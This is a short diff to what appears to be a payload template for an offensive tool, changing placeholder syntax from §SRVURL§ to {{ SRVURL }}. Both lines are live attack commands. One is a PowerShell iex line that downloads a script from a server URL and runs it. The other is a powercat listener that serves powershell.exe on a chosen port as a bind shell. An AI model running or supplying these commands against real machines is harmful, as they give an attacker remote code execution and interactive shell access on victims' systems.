@@ -1,2 +1,2 @@
-iex (New-Object System.Net.Webclient).DownloadString('§SRVURL§')
+iex (New-Object System.Net.Webclient).DownloadString('{{ SRVURL }}')
 powercat -l -p {{ LPORT }} -e powershell.exe
